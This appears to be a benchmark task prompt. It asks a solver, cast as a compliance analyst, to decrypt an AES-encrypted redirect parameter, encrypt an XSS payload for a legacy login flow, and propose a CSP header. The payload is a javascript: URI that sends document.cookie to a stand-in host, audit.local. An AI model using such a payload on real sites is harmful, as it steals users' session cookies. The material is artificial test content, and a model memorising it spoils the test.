You are acting as a compliance analyst for a financial organization. You are tasked with generating an audit trail for a recently discovered open redirect and XSS vulnerability in the organization's legacy login flow.

The legacy application encrypts the redirect target URL in a URL parameter called `state` using AES-256-CBC. However, it blindly decrypts this parameter and redirects the user to the resulting URI, which allows for XSS if a `javascript:` URI is provided.

You have been provided with two files in your home directory:
1. `/home/user/app_config.json` - Contains the application's AES key and IV (in hex format) used for encrypting the redirect state.
2. `/home/user/intercepted_request.txt` - Contains a captured HTTP request with a `state` parameter (hex string).

Your objectives are to:
1. **Decrypt the Payload:** Read the intercepted request, extract the `state` parameter, and decrypt it using the key and IV from the configuration. The payload uses PKCS7 padding.
2. **Craft an Exploit Payload:** Create a malicious encrypted `state` payload. The plaintext of your payload must be EXACTLY the following URI: `javascript:fetch('http://audit.local/?log='+btoa(document.cookie))`
   Encrypt this string using the same AES-256-CBC key, IV, and PKCS7 padding, and encode the result as a hex string.
3. **Design a CSP Mitigation:** The application currently lacks a Content Security Policy. Define a strict CSP header value that sets `default-src` to `'none'` and restricts `script-src` to only `'self'` and `https://apis.local`.

You must write a Python script to perform the cryptography and generate the final audit report. You may install necessary Python packages (e.g., `pycryptodome`) using `pip`.

Finally, generate an audit trail file exactly at `/home/user/audit_trail.json`. The file must be valid JSON and contain the following keys:
- `"decrypted_original_url"`: The plaintext string obtained from decrypting the intercepted state.
- `"malicious_state_payload"`: The hex string of your crafted, encrypted malicious payload.
- `"recommended_csp"`: The exact Content Security Policy header string you designed based on the requirements.